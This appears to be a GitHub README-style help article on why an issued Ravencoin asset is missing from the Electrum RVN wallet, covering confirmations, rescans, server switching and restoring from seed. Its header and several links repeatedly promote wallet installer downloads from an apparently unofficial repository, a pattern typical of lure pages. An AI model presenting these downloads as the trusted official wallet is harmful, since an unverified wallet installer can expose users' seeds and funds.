![Electrum RVN](assets/banner-article.png)

# Issued Asset Missing from Electrum RVN

<!-- compact-download-block -->

<p align="center">Confirmations, rescans, and what to check</p>

<p align="center"><a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F05239?style=for-the-badge&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="Download for macOS"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F05239?style=for-the-badge&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`electrum-rvn-v4.8.0-setup.exe`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-F05239?style=flat-square&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="macOS"> | macOS 12 or later | [`electrum-rvn-v4.8.0.dmg`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg) |
| <img src="https://img.shields.io/badge/Linux-F05239?style=flat-square&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-rvn-v4.8.0.AppImage`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage) |

</div>

All versions and checksums are on the [release page](https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0).

> [!WARNING]
> Only download from this GitHub release page.

<!-- /compact-download-block -->
An asset you issued that does not appear is almost always one of two things: it has not confirmed yet, or the wallet is looking at a stale view. Rescan first, then switch servers. The issuance is on the chain long before your wallet's display catches up, and the chain is the authority.

## Confirm the asset exists before fixing the wallet

Open a block explorer and search for the asset name or the issuance transaction ID.

- **It is not on the chain** - the transaction never confirmed. It may still be in the mempool with a low fee, or it may have failed to broadcast.
- **It is on the chain** - the asset exists. Everything from here is a display problem, and none of it risks the asset.

That five-second check decides which half of this page you need. Without it, people reinstall wallets to fix something that is happening on the network.

## If it is not on the chain

**Still pending.** Check the transaction in the wallet's history. If it is unconfirmed, the fee was probably too low for the mempool at that moment - [stuck Ravencoin transaction in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/stuck-ravencoin-transaction-in-electrum-rvn.md) covers the Replace-By-Fee repair.

**Never broadcast.** The wallet was disconnected when you confirmed. The transaction will be sitting unsent; reconnect and retry, or rebuild it.

**Name rejected.** A name that is already claimed is not available. The wallet or the network will refuse the issuance, and the fix is a different name - [how to issue a Ravencoin asset in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/issue-a-ravencoin-asset-in-electrum-rvn.md).

## If it is on the chain

Work in this order. Stop as soon as the asset appears.

**1. Wait for confirmations.** Issuance is a transaction, and the wallet's asset list updates as the transaction confirms. The site's own troubleshooting names confirmations as the reason an issued asset is not yet visible.

**2. Rescan.** A rescan makes the wallet re-query its addresses instead of trusting a cached view. That is usually enough.

**3. Switch servers.** A server that is behind, or that answers inconsistently, leaves the wallet looking at an old picture. Try another from the server list, then rescan.

**4. Check the wallet is on the right network.** A wallet switched to testnet shows nothing of mainnet assets, and the reverse is also true.

**5. Check you are looking at the right wallet.** Several wallet files, several windows - the asset belongs to the wallet that issued it, and a different wallet file will show nothing.

**6. Update the wallet.** Asset handling has been an active area of development. An older build can show a transaction without its asset payload, which looks exactly like a missing asset - https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0.

## What not to do

**Do not re-issue the asset** because the first one seems missing. If it confirmed, you now have two names and two charges, and the first is not gone.

**Do not send the asset anywhere** until you can see it and its balance. A display problem is recoverable; a transfer to a wallet that ignores assets is not.

**Do not delete the wallet** in an attempt to refresh it. The seed restores the asset, but you will lose the labels and the local history for no reason.

**Do not assume the funds are gone.** The asset lives at an address derived from your seed; if the seed is intact, the asset is intact.

## What is actually happening

The wallet is a light client: it asks servers about the addresses it derives and shows what comes back. Between issuing and displaying, three things have to line up - the transaction confirmed, the server knows about it, and the wallet has re-queried.

Each of the three has its own symptom, which is why the order above is worth following rather than trying everything at once. A confirmation wait looks like nothing happening; a stale server looks like a wallet that disagrees with an explorer; a cached view looks like a wallet that disagrees with itself after a restart.

## Issued an asset to a wallet you no longer have

Then the seed is the wallet. Install the current release, restore, let it rescan, and the asset appears at the same addresses - [restore a wallet from an Electrum RVN seed](https://github.com/electrum-source/passphrase-backup/blob/main/restore-a-wallet-from-an-electrum-rvn-seed.md). If the balance is zero after the restore, check the derivation path before anything else - [zero balance after restoring Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/zero-balance-after-restoring-electrum-rvn.md).

## Preventing it next time

Issue with the wallet already connected and confirmed-synced, keep enough RVN for a normal fee, and check the asset on an explorer before you announce it to anyone. A minute of patience beats an hour of troubleshooting.

The wallet is actively maintained, and the current release is on the releases page: https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0. What issuance costs is the chain-level charge described in [Ravencoin asset issuance cost](https://github.com/electrum-source/token-and-network/blob/main/ravencoin-asset-issuance-cost-in-electrum-rvn.md), and the object itself is [what is a Ravencoin asset?](https://github.com/electrum-source/token-and-network/blob/main/what-is-a-ravencoin-asset-in-electrum-rvn.md). If the asset is visible but will not move, that is the fee question in [transferring Ravencoin assets](https://github.com/electrum-source/token-and-network/blob/main/transferring-ravencoin-assets-with-electrum-rvn.md), and if it never confirms at all, [burning and reissuing assets](https://github.com/electrum-source/token-and-network/blob/main/burning-and-reissuing-assets-with-electrum-rvn.md) explains what of the issuance is reversible - almost nothing.

## FAQ

### Why is my asset not showing after issuing?

Usually confirmations or a stale server. Check the issuance on an explorer first: if it is there, rescan and switch servers.

### How long should I wait?

A few confirmations. If the transaction itself is unconfirmed for a long time, the fee is the problem, not the asset.

### Can I issue it again to fix it?

Do not. If the first issuance confirmed, the name is taken by you and a second issuance is a second charge, not a repair.

### Is the asset lost if the wallet does not show it?

No. It exists at an address derived from your seed. A restore from the seed brings it back.

### Does switching servers risk anything?

No. The server list is how the wallet reads the chain; changing it changes who answers, not what exists.

<!-- related-articles -->

## Related articles

- [Stuck Ravencoin Transaction in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/stuck-ravencoin-transaction-in-electrum-rvn.md)
- [How to Issue a Ravencoin Asset in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/issue-a-ravencoin-asset-in-electrum-rvn.md)
- [Restore a Wallet From an Electrum RVN Seed](https://github.com/electrum-source/passphrase-backup/blob/main/restore-a-wallet-from-an-electrum-rvn-seed.md)
- [Zero Balance After Restoring Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/zero-balance-after-restoring-electrum-rvn.md)
